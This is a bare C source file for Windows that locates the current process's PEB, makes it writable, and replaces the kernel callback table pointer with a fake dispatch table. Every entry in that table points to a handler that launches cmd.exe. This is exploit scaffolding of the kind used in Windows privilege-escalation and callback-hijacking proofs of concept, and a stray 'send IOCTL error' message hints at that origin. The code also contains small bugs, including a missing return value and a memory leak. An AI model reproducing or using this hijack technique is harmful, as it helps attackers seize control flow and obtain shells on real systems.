#include <windows.h>
#include <psapi.h>
#include <tchar.h>
#include <stdio.h>
#include<Windows.h>
#include<intrin.h>
#include<Winnt.h>


typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID ExitStatus;
    void* PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation
    // We don't need the others
} PROCESSINFOCLASS;


#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#if !defined(STATUS_SUCCESS)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
    IN  HANDLE ProcessHandle,
    IN  PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN  ULONG ProcessInformationLength,
    OUT PULONG ReturnLength    OPTIONAL
);

PVOID
QueryProcessInformation (
    IN HANDLE Process,
    IN PROCESSINFOCLASS ProcessInformationClass,
    IN DWORD ProcessInformationLength
) {
    PPROCESS_BASIC_INFORMATION pProcessInformation = NULL;
    pfnNtQueryInformationProcess gNtQueryInformationProcess;
    ULONG ReturnLength = 0;
    NTSTATUS Status;
    HMODULE hNtDll;

    if (!(hNtDll = LoadLibraryA("ntdll.dll"))) {
        printf ("Cannot load ntdll.dll.\n");
        return NULL;
    }

    if (!(gNtQueryInformationProcess = (pfnNtQueryInformationProcess) GetProcAddress (hNtDll, "NtQueryInformationProcess"))) {
        printf ("Cannot load NtQueryInformationProcess.\n");
        return NULL;
    }

    // Allocate the memory for the requested structure
    if ((pProcessInformation =(PPROCESS_BASIC_INFORMATION) malloc (ProcessInformationLength)) == NULL) {
        printf ("ExAllocatePoolWithTag failed.\n");
        return NULL;
    }

    // Fill the requested structure
    if (!NT_SUCCESS (Status = gNtQueryInformationProcess (Process, ProcessInformationClass, pProcessInformation, ProcessInformationLength, &ReturnLength))) {
        printf ("NtQueryInformationProcess should return NT_SUCCESS (Status = %#x).\n", Status);
        free (pProcessInformation);
        return NULL;
    }

    // Check the requested structure size with the one returned by NtQueryInformationProcess
    if (ReturnLength != ProcessInformationLength) {
        printf ("Warning : NtQueryInformationProcess ReturnLength is different than ProcessInformationLength\n");
        return NULL;
    }

    return pProcessInformation;
}



void*
GetCurrentPebProcess (
    void
) {
    PPROCESS_BASIC_INFORMATION pProcessInformation = NULL;
    DWORD ProcessInformationLength = sizeof (PROCESS_BASIC_INFORMATION);
    HANDLE Process = GetCurrentProcess();
    void* pPeb = NULL;

    // ProcessBasicInformation returns information about the PebBaseAddress
    if ((pProcessInformation =(PPROCESS_BASIC_INFORMATION) QueryProcessInformation (Process, ProcessBasicInformation, ProcessInformationLength)) == NULL) {
        printf ("Handle=%x : QueryProcessInformation failed.\n", Process);
        return NULL;
    }

    // Check the correctness of the value returned
    if (pProcessInformation->PebBaseAddress == NULL) {
        printf ("Handle=%x : PEB address cannot be found.\n", Process);
        free (pProcessInformation);
        return NULL;
    }

    pPeb = pProcessInformation->PebBaseAddress;

    // Cleaning
    free (pProcessInformation);

    return pPeb;
}



void CallbackHandler()
{


	 STARTUPINFO si = {0};
	 PROCESS_INFORMATION pi = {0};
	si.cb = sizeof(si);

	CreateProcess(
        NULL,
        "cmd.exe",
        NULL,
        NULL,
        TRUE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    );

	exit(0);
}

void getTIB()
{
  //  return  (void *)__readgsword(0x18);
}

int* DispatchTable[10];
#define   DISPATCH_TABLE_SIZE  10
int FackDispatchTable()
{

DWORD oldpt;
char* peb=(char*)GetCurrentPebProcess();

printf("PEB is  %p \r\n",peb);


 if(!VirtualProtect(peb,0x300,PAGE_READWRITE,&oldpt))
{
	fprintf(stderr,"send IOCTL error %d.\n",GetLastError());
	return 0;
}

 printf("DispatchTable is  %p \r\n",DispatchTable);
 printf("CallbackHandler is  %p \r\n",CallbackHandler);

 int *x=(int*)&DispatchTable;
 memcpy(peb+0x058,&x,sizeof(int*));

}



void installhook()
{

int* y=(int*)&CallbackHandler;
for(int i=0;i<DISPATCH_TABLE_SIZE;i++ )
	memcpy(DispatchTable+i,&y,sizeof(int*));
}
